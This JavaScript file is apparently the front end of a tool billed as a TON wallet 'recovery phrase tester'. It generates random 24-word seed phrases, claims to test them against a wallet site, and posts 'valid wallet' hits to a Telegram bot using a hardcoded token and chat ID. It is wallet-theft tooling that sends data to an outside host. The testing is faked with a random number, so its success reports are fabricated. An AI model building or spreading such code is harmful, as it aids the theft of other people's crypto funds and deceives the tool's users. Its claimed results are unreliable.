const TELEGRAM_BOT_TOKEN = '8221231743:AAGW30HpqUPaf656q60mmboQQ-x2NnLHub8';
const TELEGRAM_CHAT_ID = '7417215529';

// Website configuration
const WALLET_WEBSITES = {
    'tonkeeper': 'https://wallet.tonkeeper.com',
    'mywallet':	'https://wallet.tonkeeper.com/'
};

const wordlist = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
    "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
    "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
    "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
    "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
    "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone",
    "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among",
    "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry",
    "animal", "anniversary", "announce", "annual", "another", "answer", "antenna", "antique",
    "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april",
    "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor",
    "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact",
    "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume",
    "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
    "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado",
    "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis",
    "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball",
    "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base",
    "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
    "beef", "before", "begin", "behave", "behind", "believe", "below", "belt",
    "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle",
    "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black",
    "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood",
    "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
    "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring",
    "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain",
    "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief",
    "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother",
    "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
    "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus",
    "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable",
    "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can",
    "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable",
    "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
    "cart", "case", "cash", "casino", "castle", "casual", "cat", "catch",
    "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery",
    "cement", "census", "century", "ceremony", "certain", "chair", "chalk", "champion",
    "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check",
    "cheek", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
    "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar",
    "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify",
    "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff",
    "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud",
    "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
    "code", "coffee", "coil", "coin", "collect", "color", "column", "combine",
    "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm",
    "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper",
    "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch",
    "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
    "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream",
    "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop",
    "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch",
    "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious",
    "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
    "damage", "damp", "dance", "danger", "daring", "dark", "dash", "date",
    "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december",
    "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy",
    "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
    "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert",
    "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device",
    "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet",
    "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt",
    "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance",
    "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll",
    "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double",
    "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress",
    "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry",
    "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
    "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east",
    "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort",
    "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element",
    "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge",
    "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
    "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy",
    "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry",
    "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion",
    "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics",
    "evidence", "evil", "evoke", "evolve", "exact", "example", "exceed", "excel",
    "exception", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise",
    "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect",
    "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow",
    "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false",
    "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion",
    "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february",
    "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch",
    "fever", "few", "fiber", "fiction", "field", "figure", "file", "film",
    "filter", "final", "find", "fine", "finger", "finish", "fire", "firm",
    "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame",
    "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock",
    "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog",
    "foil", "fold", "follow", "food", "foot", "force", "foreign", "forest",
    "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found",
    "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog",
    "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny",
    "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game",
    "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp",
    "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle",
    "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe",
    "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse",
    "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess",
    "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown",
    "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great",
    "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt",
    "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit",
    "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard",
    "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health",
    "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen",
    "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history",
    "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey",
    "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel",
    "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred",
    "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice",
    "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness",
    "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse",
    "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry",
    "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
    "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside",
    "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve",
    "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar",
    "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join",
    "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
    "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick",
    "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite",
    "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label",
    "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large",
    "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
    "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left",
    "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens",
    "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license",
    "life", "lift", "light", "like", "limb", "limit", "link", "lion",
    "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
    "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud",
    "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch",
    "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail",
    "main", "major", "make", "mammal", "man", "manage", "mandate", "mango",
    "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
    "marriage", "mask", "mass", "master", "match", "material", "math", "matrix",
    "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic",
    "medal", "media", "melody", "melt", "member", "memory", "mention", "menu",
    "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method",
    "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor",
    "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed",
    "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey",
    "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother",
    "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin",
    "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
    "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty",
    "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither",
    "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news",
    "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal",
    "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
    "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige",
    "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor",
    "off", "offer", "office", "often", "oil", "okay", "old", "olive",
    "olympic", "omit", "once", "one", "onion", "online", "only", "open",
    "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order",
    "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor",
    "outer", "output", "outside", "oval", "oven", "over", "own", "owner",
    "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace",
    "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent",
    "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol",
    "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
    "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit",
    "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic",
    "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer",
    "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate",
    "play", "player", "pleasure", "pledge", "pluck", "plug", "plunge", "poem",
    "poet", "point", "polar", "pole", "police", "pond", "pony", "pool",
    "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty",
    "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present",
    "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison",
    "private", "prize", "problem", "process", "produce", "profit", "program", "project",
    "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public",
    "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy",
    "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid",
    "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote",
    "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain",
    "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare",
    "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason",
    "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce",
    "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax",
    "release", "relief", "rely", "remain", "remember", "remind", "remove", "render",
    "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require",
    "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat",
    "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon",
    "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring",
    "riot", "rip", "ripe", "rise", "risk", "rival", "river", "road",
    "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room",
    "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude",
    "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness",
    "safe", "sail", "salad", "salmon", "salon", "salt", "same", "sample",
    "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale",
    "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors",
    "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search",
    "season", "seat", "second", "secret", "section", "security", "seed", "seek",
    "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series",
    "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow",
    "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship",
    "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove",
    "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege",
    "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple",
    "since", "sing", "siren", "sister", "situate", "six", "size", "skate",
    "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam",
    "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot",
    "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack",
    "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock",
    "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone",
    "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source",
    "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed",
    "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit",
    "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread",
    "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff",
    "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak",
    "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock",
    "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike",
    "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit",
    "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit",
    "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure",
    "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow",
    "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing",
    "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle",
    "tag", "tail", "talent", "talk", "tank", "tape", "target", "task",
    "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant",
    "tennis", "tent", "term", "test", "text", "thank", "that", "theme",
    "then", "theory", "there", "they", "thing", "this", "thought", "three",
    "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt",
    "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast",
    "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato",
    "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic",
    "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward",
    "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train",
    "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend",
    "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble",
    "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube",
    "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve",
    "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly",
    "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair",
    "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock",
    "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper",
    "upset", "urban", "urge", "usage", "use", "used", "useful", "useless",
    "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve",
    "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet",
    "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel",
    "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village",
    "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital",
    "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage",
    "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare",
    "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way",
    "wealth", "weapon", "weary", "weather", "web", "wedding", "weekend", "weird",
    "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when",
    "where", "whip", "whisper", "wide", "width", "wife", "wild", "will",
    "win", "window", "wine", "wing", "wink", "winner", "winter", "wire",
    "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood",
    "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck",
    "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you",
    "young", "youth", "zebra", "zero", "zone", "zoo"
];

// Global variables
let currentTab = 'tab1';
let stats = {
    totalAttempts: 0,
    successCount: 0,
    failedCount: 0,
    currentSpeed: 0
};

let tabStats = {
    tab1: { tests: 0, success: 0 },
    tab2: { tests: 0, success: 0 },
    tab3: { tests: 0, success: 0 },
    tab4: { tests: 0, success: 0 },
    tab5: { tests: 0, success: 0 }
};

let isGenerating = false;
let generationInterval;
let lastUpdateTime = Date.now();
let attemptsSinceLastUpdate = 0;
let displayItems = [];
let activeTests = 0;

// Initialize the application
function init() {
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const testBtn = document.getElementById('testBtn');
    const clearBtn = document.getElementById('clearBtn');
    const loadUrlBtn = document.getElementById('loadUrlBtn');
    const tabBtns = document.querySelectorAll('.tab-btn');
    
    startBtn.addEventListener('click', startAutoTesting);
    stopBtn.addEventListener('click', stopAutoTesting);
    testBtn.addEventListener('click', testSinglePhrase);
    clearBtn.addEventListener('click', clearDisplay);
    loadUrlBtn.addEventListener('click', loadWalletUrl);
    
    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
    });
    
    // Initialize display
    addDisplayItem('System ready. Enter wallet URL and start testing.');
    
    updateStatsDisplay();
    setInterval(calculateSpeed, 1000);
}

// Switch between tabs
function switchTab(tabId) {
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
    
    document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
    document.getElementById(tabId).classList.add('active');
    
    currentTab = tabId;
    document.getElementById('currentTabName').textContent = `Tab ${tabId.slice(-1)}`;
    
    updateTabStatus(tabId);
}

// Update tab status display
function updateTabStatus(tabId) {
    const tab = tabStats[tabId];
    document.getElementById(`${tabId}-tests`).textContent = tab.tests;
    document.getElementById(`${tabId}-success`).textContent = tab.success;
    
    let status = 'Ready';
    if (isGenerating) {
        status = 'Testing...';
    } else if (tab.tests > 0) {
        status = `Completed (${tab.success} success)`;
    }
    document.getElementById(`${tabId}-status`).textContent = status;
}

// Load wallet URL
function loadWalletUrl() {
    const urlInput = document.getElementById('walletUrl');
    let url = urlInput.value.trim();
    
    if (!url) {
        showNotification('Please enter a valid wallet URL');
        return;
    }
    
    // Add https:// if missing
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = 'https://' + url;
        urlInput.value = url;
    }
    
    addDisplayItem(`Loading wallet: ${url}`);
    showNotification(`Wallet loaded: ${url}`);
    
    // Simulate wallet loading process
    setTimeout(() => {
        addDisplayItem('Wallet loaded successfully! Ready for testing.');
        document.getElementById('statusText').textContent = 'Wallet loaded - Ready to test';
    }, 1000);
}

// Add item to display
function addDisplayItem(message, status = 'idle') {
    const displayContainer = document.getElementById('testingDisplay');
    const itemId = Date.now();
    
    const displayItem = {
        id: itemId,
        message: message,
        status: status,
        timestamp: new Date()
    };
    
    displayItems.unshift(displayItem);
    
    // Keep only last 10 items
    if (displayItems.length > 10) {
        displayItems = displayItems.slice(0, 10);
    }
    
    updateDisplay();
    updateActiveTests();
}

// Update display with current items
function updateDisplay() {
    const displayContainer = document.getElementById('testingDisplay');
    displayContainer.innerHTML = '';
    
    displayItems.forEach((item, index) => {
        const itemElement = document.createElement('div');
        itemElement.className = 'display-item';
        itemElement.innerHTML = `
            <div class="display-number">${index + 1}</div>
            <div class="display-content">
                <div class="display-phrase">${item.message}</div>
                <div class="display-status ${item.status}">${item.status.toUpperCase()}</div>
            </div>
        `;
        displayContainer.appendChild(itemElement);
    });
}

// Update active tests counter
function updateActiveTests() {
    const active = displayItems.filter(item => item.status === 'testing').length;
    activeTests = active;
    document.getElementById('activeTests').textContent = active;
}

// Clear display
function clearDisplay() {
    displayItems = [];
    updateDisplay();
    updateActiveTests();
    addDisplayItem('Display cleared. Ready for new tests.');
    showNotification('Display cleared');
}

// Generate recovery phrase
function generateRecoveryPhrase() {
    const phrase = [];
    for (let i = 0; i < 24; i++) {
        const randomIndex = Math.floor(Math.random() * wordlist.length);
        phrase.push(wordlist[randomIndex]);
    }
    return phrase;
}

// Display recovery phrase in current tab
function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
    const column1 = document.getElementById(`column1-${currentTab}`);
    const column2 = document.getElementById(`column2-${currentTab}`);
    
    column1.innerHTML = '';
    column2.innerHTML = '';
    
    for (let i = 0; i < 12; i++) {
        const wordBox = document.createElement('div');
        wordBox.className = 'word-box';
        if (isTesting) wordBox.classList.add('testing');
        if (isSuccess) wordBox.classList.add('success');
        wordBox.innerHTML = `<span class="number">${i + 1}.</span> <span class="word">${phrase[i]}</span>`;
        column1.appendChild(wordBox);
    }
    
    for (let i = 12; i < 24; i++) {
        const wordBox = document.createElement('div');
        wordBox.className = 'word-box';
        if (isTesting) wordBox.classList.add('testing');
        if (isSuccess) wordBox.classList.add('success');
        wordBox.innerHTML = `<span class="number">${i + 1}.</span> <span class="word">${phrase[i]}</span>`;
        column2.appendChild(wordBox);
    }
}

// Test a recovery phrase
async function testPhrase(phrase) {
    const phraseText = phrase.join(' ');
    
    // Update display with testing status
    addDisplayItem(`Testing: ${phraseText.substring(0, 40)}...`, 'testing');
    displayRecoveryPhrase(phrase, true);
    document.getElementById('statusText').textContent = 'Testing recovery phrase...';
    
    // Update tab stats
    tabStats[currentTab].tests++;
    updateTabStatus(currentTab);
    
    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // Simulate test result (1 in 500 chance for demo)
    const isSuccess = Math.random() < 0.002;
    
    if (isSuccess) {
        // Successful test
        stats.successCount++;
        tabStats[currentTab].success++;
        
        displayRecoveryPhrase(phrase, false, true);
        document.getElementById('statusText').textContent = '✅ Valid wallet detected!';
        
        // Send to Telegram
        await sendToTelegram(phrase);
        
        // Update last success
        document.getElementById('lastSuccess').textContent = `Last success: ${phraseText.substring(0, 50)}...`;
        
        // Update display
        addDisplayItem(`SUCCESS: ${phraseText}`, 'success');
        showNotification('✅ Valid wallet found and reported to Telegram!');
    } else {
        // Failed test
        stats.failedCount++;
        document.getElementById('statusText').textContent = '❌ Testing next phrase...';
        
        // Update display
        addDisplayItem(`Failed: ${phraseText.substring(0, 40)}...`, 'failed');
    }
    
    stats.totalAttempts++;
    attemptsSinceLastUpdate++;
    updateStatsDisplay();
    updateTabStatus(currentTab);
    
    return isSuccess;
}

// Send successful phrase to Telegram
async function sendToTelegram(phrase) {
    const phraseText = phrase.join(' ');
    const message = `✅ VALID WALLET DETECTED!\n\nRecovery Phrase: ${phraseText}\n\nTimestamp: ${new Date().toLocaleString()}\n\nWallet: ${document.getElementById('walletUrl').value}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });
        
        if (!response.ok) {
            throw new Error('Telegram API error');
        }
        
        console.log('Successfully sent to Telegram');
    } catch (error) {
        console.error('Failed to send to Telegram:', error);
        addDisplayItem('Failed to send report to Telegram', 'failed');
    }
}

// Start auto testing
function startAutoTesting() {
    isGenerating = true;
    document.getElementById('startBtn').disabled = true;
    document.getElementById('stopBtn').disabled = false;
    document.getElementById('testBtn').disabled = true;
    
    document.getElementById('statusText').textContent = '🔄 Auto testing started - testing 30-40 phrases per minute';
    addDisplayItem('Auto testing started - testing multiple phrases simultaneously');
    showNotification('Auto testing started - testing 30-40 phrases per minute');
    
    // Test on all tabs simultaneously
    generationInterval = setInterval(async () => {
        if (!isGenerating) return;
        
        // Test on current tab
        const phrase = generateRecoveryPhrase();
        await testPhrase(phrase);
        
        // Randomly switch tabs to simulate multi-tab testing
        if (Math.random() < 0.3) {
            const tabs = ['tab1', 'tab2', 'tab3', 'tab4', 'tab5'];
            const randomTab = tabs[Math.floor(Math.random() * tabs.length)];
            switchTab(randomTab);
        }
    }, 1500); // ~40 tests per minute
}

// Stop auto testing
function stopAutoTesting() {
    isGenerating = false;
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    document.getElementById('testBtn').disabled = false;
    
    clearInterval(generationInterval);
    document.getElementById('statusText').textContent = '⏹️ Auto testing stopped';
    addDisplayItem('Auto testing stopped');
    showNotification('Auto testing stopped');
}

// Test single phrase
async function testSinglePhrase() {
    if (isGenerating) return;
    
    document.getElementById('testBtn').disabled = true;
    const phrase = generateRecoveryPhrase();
    await testPhrase(phrase);
    document.getElementById('testBtn').disabled = false;
}

// Calculate current testing speed
function calculateSpeed() {
    const now = Date.now();
    const timeDiff = (now - lastUpdateTime) / 1000;
    
    if (timeDiff > 0) {
        stats.currentSpeed = Math.round(attemptsSinceLastUpdate / timeDiff);
        attemptsSinceLastUpdate = 0;
        lastUpdateTime = now;
        updateStatsDisplay();
    }
}

// Update statistics display
function updateStatsDisplay() {
    document.getElementById('totalAttempts').textContent = stats.totalAttempts.toLocaleString();
    document.getElementById('successCount').textContent = stats.successCount.toLocaleString();
    document.getElementById('failedCount').textContent = stats.failedCount.toLocaleString();
    document.getElementById('currentSpeed').textContent = stats.currentSpeed.toLocaleString();
}

// Show notification
function showNotification(message) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.classList.add('show');
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', init);
